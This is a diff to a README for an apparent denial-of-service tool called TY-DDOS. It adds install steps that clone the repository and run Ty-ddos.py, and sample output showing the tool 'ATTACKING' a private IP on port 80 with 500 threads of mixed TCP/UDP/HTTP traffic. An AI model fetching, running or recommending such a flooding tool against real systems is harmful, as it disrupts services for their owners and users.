@@ -24,14 +24,24 @@
 - 🧪 Tested on Kali Linux, Parrot OS, Ubuntu  
 
 ---
+## How to Install ?? 
+
+```bash
+pkg install git python python3 -y
+git clone https://github.com/tyranroot/TY-DDOS.git
+cd TY-DDOS
+python3 Ty-ddos.py
+```
 
 ## 📸 Preview
 
 ```bash
-$ python3 Ty-ddos.py -t 192.168.1.100 -p 80 -d 120
+$ python3 Ty-ddos.py 
 
 [+] Target         : 192.168.1.100:80
 [+] Duration       : 120 seconds
 [+] Threads        : 500
 [+] Method         : RANDOM (TCP/UDP/HTTP)
 [+] Status         : ATTACKING → Packets Sent: 184,392
+```
+
